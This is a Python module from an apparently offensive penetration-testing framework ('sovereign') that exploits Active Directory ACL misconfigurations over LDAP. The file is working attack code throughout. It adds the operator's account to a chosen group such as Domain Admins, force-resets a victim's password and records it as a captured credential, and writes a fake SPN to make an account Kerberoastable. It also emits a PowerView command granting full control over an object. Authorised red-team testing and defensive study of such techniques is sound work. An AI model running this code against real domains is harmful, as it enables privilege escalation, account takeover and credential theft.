"""Exploit AD ACL misconfigurations: GenericAll, WriteDACL, GenericWrite, WriteOwner."""

from __future__ import annotations

import random
from typing import List

from sovereign.models import AttackResult, Credential, EngagementContext
from sovereign.logger import log
from sovereign.modules.base import BaseModule
from sovereign.utils.ldap_helpers import ldap_connect, ldap_search

try:
    import ldap3 as _ldap3
    LDAP3 = True
except ImportError:
    LDAP3 = False


class ACLAbuseModule(BaseModule):
    """Exploit AD ACL misconfigurations: GenericAll, WriteDACL, GenericWrite, WriteOwner."""

    name = "acl-abuse"

    def run(self, ctx: EngagementContext, **kwargs: object) -> List[AttackResult]:
        target_user: str = str(kwargs.get("target_user", ""))
        abuse_right: str = str(kwargs.get("abuse_right", "auto"))

        results: List[AttackResult] = []
        if not LDAP3:
            return [AttackResult("acl-abuse", "setup", "FAILED",
                                 notes="Install ldap3: pip install ldap3")]
        if not ctx.ldap_conn and not ldap_connect(ctx):
            return [AttackResult("acl-abuse", "connect", "FAILED")]

        if not target_user:
            return [AttackResult("acl-abuse", "config", "FAILED",
                                 notes="Specify target with --acl-target (e.g., 'Domain Admins' or username)")]

        # Find target DN
        is_group = True
        entries = ldap_search(ctx, f"(sAMAccountName={target_user})",
                              ["distinguishedName","objectClass"])
        if not entries:
            entries = ldap_search(ctx, f"(cn={target_user})", ["distinguishedName","objectClass"])
            if not entries:
                return [AttackResult("acl-abuse", "target_lookup", "FAILED",
                                     notes=f"Cannot find '{target_user}' in AD")]

        target_dn = str(entries[0].distinguishedName)
        obj_class  = [str(c) for c in (getattr(entries[0], "objectClass", []) or [])]
        is_group   = "group" in obj_class

        # Get our own DN
        self_entries = ldap_search(ctx, f"(sAMAccountName={ctx.username})",
                                   ["distinguishedName"])
        self_dn = str(self_entries[0].distinguishedName) if self_entries else ""

        log(f"[ACL] Target: {target_dn} (group={is_group})", "INFO")

        # Detect right automatically based on what we have
        right = abuse_right.lower()

        if right in ("auto", "genericall", "addmember") and is_group:
            results.extend(self._add_member(ctx, target_dn, self_dn, target_user))
        elif right in ("auto", "genericall", "forcechangepassword") and not is_group:
            results.extend(self._force_change_password(ctx, target_dn, target_user))
        elif right in ("genericwrite", "writespn"):
            results.extend(self._write_spn(ctx, target_dn, target_user))
        elif right in ("writedacl",):
            results.extend(self._grant_full_control(ctx, target_dn, self_dn, target_user))
        else:
            # Try all applicable abuses
            if is_group:
                results.extend(self._add_member(ctx, target_dn, self_dn, target_user))
            else:
                results.extend(self._force_change_password(ctx, target_dn, target_user))

        return results

    def _add_member(self, ctx: EngagementContext, group_dn: str,
                    member_dn: str, group_name: str) -> List[AttackResult]:
        try:
            from ldap3 import MODIFY_ADD
            result = ctx.ldap_conn.modify(
                group_dn,
                {"member": [(MODIFY_ADD, [member_dn])]}
            )
            if ctx.ldap_conn.result["result"] == 0:
                log(f"[ACL] Added {ctx.username} to {group_name}!", "CRIT")
                return [AttackResult("acl-abuse", "add_member", "SUCCESS",
                                     target=group_name, severity="CRITICAL",
                                     notes=f"Added '{ctx.username}' to '{group_name}'. "
                                           f"Re-auth to get new group membership token.")]
            else:
                return [AttackResult("acl-abuse", "add_member", "FAILED",
                                     target=group_name,
                                     notes=f"LDAP error: {ctx.ldap_conn.result}")]
        except Exception as exc:
            return [AttackResult("acl-abuse", "add_member", "FAILED",
                                 target=group_name, notes=str(exc))]

    def _force_change_password(self, ctx: EngagementContext, user_dn: str,
                                username: str) -> List[AttackResult]:
        new_pass = f"Sovereign!{random.randint(1000,9999)}"
        try:
            from ldap3 import MODIFY_REPLACE, MODIFY_DELETE, MODIFY_ADD
            new_pass_enc = f'"{new_pass}"'.encode("utf-16-le")
            result = ctx.ldap_conn.modify(
                user_dn,
                {"unicodePwd": [(MODIFY_REPLACE, [new_pass_enc])]}
            )
            if ctx.ldap_conn.result["result"] == 0:
                log(f"[ACL] Password changed for {username}: {new_pass}", "CRIT")
                ctx.credentials.append(Credential(
                    "ldap_force_password", ctx.domain, username, new_pass,
                    "acl_abuse_force_change_password",
                    notes=f"Password force-changed via WriteDACL/GenericAll"
                ))
                return [AttackResult("acl-abuse", "force_password", "SUCCESS",
                                     target=username, severity="CRITICAL",
                                     data={"username": username, "new_password": new_pass},
                                     notes=f"Password for '{username}' reset to '{new_pass}'")]
            else:
                return [AttackResult("acl-abuse", "force_password", "FAILED",
                                     target=username,
                                     notes=f"LDAP error: {ctx.ldap_conn.result}")]
        except Exception as exc:
            return [AttackResult("acl-abuse", "force_password", "FAILED",
                                 target=username, notes=str(exc))]

    def _write_spn(self, ctx: EngagementContext, user_dn: str,
                   username: str) -> List[AttackResult]:
        """Write a fake SPN to enable targeted Kerberoasting."""
        try:
            from ldap3 import MODIFY_REPLACE
            fake_spn = f"http/{username}.{ctx.domain}:80/{username}"
            result = ctx.ldap_conn.modify(
                user_dn,
                {"servicePrincipalName": [(MODIFY_REPLACE, [fake_spn])]}
            )
            if ctx.ldap_conn.result["result"] == 0:
                log(f"[ACL] SPN written for {username}: {fake_spn}. Now Kerberoastable!", "CRIT")
                return [AttackResult("acl-abuse", "write_spn", "SUCCESS",
                                     target=username, severity="CRITICAL",
                                     data={"spn": fake_spn},
                                     notes=f"SPN '{fake_spn}' written to '{username}'. "
                                           f"Now run: --modules kerberoast to extract TGS hash")]
            else:
                return [AttackResult("acl-abuse", "write_spn", "FAILED",
                                     target=username,
                                     notes=str(ctx.ldap_conn.result))]
        except Exception as exc:
            return [AttackResult("acl-abuse", "write_spn", "FAILED",
                                 target=username, notes=str(exc))]

    def _grant_full_control(self, ctx: EngagementContext, target_dn: str,
                             self_dn: str, target_name: str) -> List[AttackResult]:
        return [AttackResult("acl-abuse", "writedacl", "PARTIAL",
                             target=target_name,
                             notes=f"WriteDACL on {target_dn}: use PowerView → "
                                   f"Add-DomainObjectAcl -TargetIdentity '{target_dn}' "
                                   f"-Rights All -PrincipalIdentity '{ctx.username}'")]
